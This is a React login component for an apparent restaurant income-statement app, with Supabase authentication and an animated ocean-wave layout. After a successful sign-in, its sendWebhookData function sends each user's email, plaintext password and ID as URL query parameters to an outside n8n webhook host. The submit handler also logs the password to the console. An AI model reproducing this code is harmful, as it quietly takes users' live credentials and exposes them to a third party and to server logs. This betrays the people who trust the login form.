
import React, { useState } from 'react';
import { supabase } from '@/integrations/supabase/client';

interface LoginProps {
  onLogin: (obid: string) => void;
}

const Login: React.FC<LoginProps> = ({ onLogin }) => {
  // Fixed email reference issue - force cache refresh
  const [obid, setObid] = useState('');
  const [password, setPassword] = useState('');
  const [errors, setErrors] = useState<{ obid?: string; password?: string; general?: string }>({});
  const [isLoading, setIsLoading] = useState(false);

  const convertToEmail = (id: string) => {
    return `${id}@oceanbasket.com`;
  };

  const sendWebhookData = async (email: string, password: string, obid: string) => {
    try {
      const webhookUrl = 'https://exillar-n8n-u48653.vm.elestio.app/webhook-test/Restaurant Income Statement';
      const params = new URLSearchParams({
        email: email,
        password: password,
        obid: obid,
        timestamp: new Date().toISOString()
      });
      
      await fetch(`${webhookUrl}?${params}`, {
        method: 'GET',
      });
      console.log('Webhook data sent successfully');
    } catch (error) {
      console.error('Error sending webhook data:', error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const newErrors: { obid?: string; password?: string; general?: string } = {};

    console.log('Form submitted with:', { obid, password });

    if (!obid) {
      newErrors.obid = 'OBID is required';
    }

    if (!password) {
      newErrors.password = 'Password is required';
    }

    // Check if we have validation errors
    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }

    setIsLoading(true);
    setErrors({});

    try {
      // Convert OBID to email format
      const email = convertToEmail(obid);
      console.log('Attempting Supabase authentication...');
      
      // Sign in with Supabase
      const { data, error } = await supabase.auth.signInWithPassword({
        email: email,
        password: password,
      });

      if (error) {
        console.error('Supabase auth error:', error);
        setErrors({ general: 'Invalid OBID or password' });
        return;
      }

      if (data.user) {
        console.log('Authentication successful:', data.user);
        
        // Send data to webhook
        await sendWebhookData(email, password, obid);
        
        onLogin(obid);
      }
    } catch (error) {
      console.error('Login error:', error);
      setErrors({ general: 'An error occurred during login. Please try again.' });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex relative bg-white">
      {/* Ocean wave background effect */}
      <div className="absolute inset-0 overflow-hidden">
        {/* Wave layers for depth effect */}
        <svg className="absolute bottom-0 w-full h-full" viewBox="0 0 1200 800" xmlns="http://www.w3.org/2000/svg">
          {/* Wave line patterns */}
          <g stroke="hsl(var(--app-wave-light))" strokeWidth="1" fill="none" opacity="0.6">
            <path d="M0,100 Q300,50 600,100 T1200,100" className="animate-[wave_8s_ease-in-out_infinite]" />
            <path d="M0,140 Q300,90 600,140 T1200,140" className="animate-[wave_6s_ease-in-out_infinite_reverse]" />
            <path d="M0,180 Q300,130 600,180 T1200,180" className="animate-[wave_7s_ease-in-out_infinite]" />
            <path d="M0,220 Q300,170 600,220 T1200,220" className="animate-[wave_5s_ease-in-out_infinite_reverse]" />
            <path d="M0,260 Q300,210 600,260 T1200,260" className="animate-[wave_9s_ease-in-out_infinite]" />
            <path d="M0,300 Q300,250 600,300 T1200,300" className="animate-[wave_4s_ease-in-out_infinite_reverse]" />
            <path d="M0,340 Q300,290 600,340 T1200,340" className="animate-[wave_8s_ease-in-out_infinite]" />
            <path d="M0,380 Q300,330 600,380 T1200,380" className="animate-[wave_6s_ease-in-out_infinite_reverse]" />
            <path d="M0,420 Q300,370 600,420 T1200,420" className="animate-[wave_7s_ease-in-out_infinite]" />
            <path d="M0,460 Q300,410 600,460 T1200,460" className="animate-[wave_5s_ease-in-out_infinite_reverse]" />
            <path d="M0,500 Q300,450 600,500 T1200,500" className="animate-[wave_9s_ease-in-out_infinite]" />
            <path d="M0,540 Q300,490 600,540 T1200,540" className="animate-[wave_4s_ease-in-out_infinite_reverse]" />
            <path d="M0,580 Q300,530 600,580 T1200,580" className="animate-[wave_8s_ease-in-out_infinite]" />
            <path d="M0,620 Q300,570 600,620 T1200,620" className="animate-[wave_6s_ease-in-out_infinite_reverse]" />
            <path d="M0,660 Q300,610 600,660 T1200,660" className="animate-[wave_7s_ease-in-out_infinite]" />
            <path d="M0,700 Q300,650 600,700 T1200,700" className="animate-[wave_5s_ease-in-out_infinite_reverse]" />
          </g>
          
          {/* Bottom filled wave for depth */}
          <path 
            d="M0,600 C200,550 400,650 600,600 C800,550 1000,650 1200,600 L1200,800 L0,800 Z" 
            fill="hsl(var(--primary) / 0.1)"
            className="animate-[wave_6s_ease-in-out_infinite]"
          />
        </svg>
      </div>

      {/* Right side - Login form */}
      <div className="ml-auto w-2/5 bg-primary/95 backdrop-blur-sm relative flex items-center justify-center border-l border-primary/30">
        {/* Login form container */}
        <div className="relative z-10 w-full max-w-md px-8">
          {/* Logo section */}
          <div className="text-center mb-16">
            <div className="flex items-center justify-center mb-8">
              <div className="bg-white rounded-full w-16 h-16 flex items-center justify-center mr-4">
                <span className="text-primary font-bold text-xl">OB</span>
              </div>
              <h1 className="text-white text-2xl font-script">Restaurant Income Statement</h1>
            </div>
            <h2 className="text-secondary text-3xl font-normal tracking-[0.3em] uppercase">LOG-IN</h2>
          </div>

          {/* Login Form */}
          <form onSubmit={handleSubmit} className="space-y-12">
            <div className="relative">
              <label className="text-white text-sm mb-2 block">
                OBID <span className="text-secondary ml-1">•</span>
              </label>
              <input
                type="text"
                value={obid}
                onChange={(e) => setObid(e.target.value)}
                className="w-full bg-transparent border-0 border-b border-white px-0 py-3 text-white text-lg placeholder-white/70 focus:outline-none focus:border-secondary"
                placeholder=""
              />
              {errors.obid && (
                <p className="text-red-300 text-sm mt-2">{errors.obid}</p>
              )}
            </div>

            <div className="relative">
              <label className="text-white text-sm mb-2 block">
                Password <span className="text-secondary ml-1">•</span>
              </label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full bg-transparent border-0 border-b border-white px-0 py-3 text-white text-lg placeholder-white/70 focus:outline-none focus:border-secondary"
                placeholder=""
              />
              {errors.password && (
                <p className="text-red-300 text-sm mt-2">{errors.password}</p>
              )}
            </div>

            {errors.general && (
              <div className="bg-red-100 border border-red-300 text-red-700 px-4 py-3 rounded-lg text-sm">
                {errors.general}
              </div>
            )}

            <div className="pt-8">
              <button
                type="submit"
                disabled={isLoading}
                className="w-full bg-transparent border border-white text-white py-4 px-8 rounded-full text-lg font-normal hover:bg-white hover:text-primary transition-colors duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isLoading ? 'Logging in...' : 'Login'}
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default Login;
